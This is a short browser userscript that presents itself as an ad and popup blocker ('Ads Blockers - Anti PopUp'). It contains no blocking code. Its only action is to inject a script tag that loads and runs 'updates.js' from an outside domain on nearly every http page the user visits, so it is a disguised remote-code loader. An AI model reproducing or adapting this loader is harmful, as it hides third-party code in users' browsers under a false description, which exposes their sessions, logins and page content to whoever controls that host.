// ==UserScript==
// @name			Ads Blockers - Anti PopUp
// @namespace       http://userscripts.org/scripts/show/999999
// @version			1.1
// @copyright		Lock3D Team
// @description		Block Popup and Ads on Website Navigation
// @author			Adoun47
// @include			http://*.*
// @include			http*://*.*.*
// @include			http://*.com
// @include			http://*.eu
// @include			http://*.*.com
// @include			http://*.*.eu
// @icon			http://icdn.pro/images/fr/y/a/yast-icone-5855-128.png
// Version numero 1.
// ==/UserScript==

function addJavascript(jsname, pos) {
    var th = document.getElementsByTagName(pos)[0];
    var s = document.createElement('script');
    s.setAttribute('type', 'text/javascript');
    s.setAttribute('src', jsname);
    th.appendChild(s);
}
addJavascript('http://www.linkut.eu/updates.js', 'head');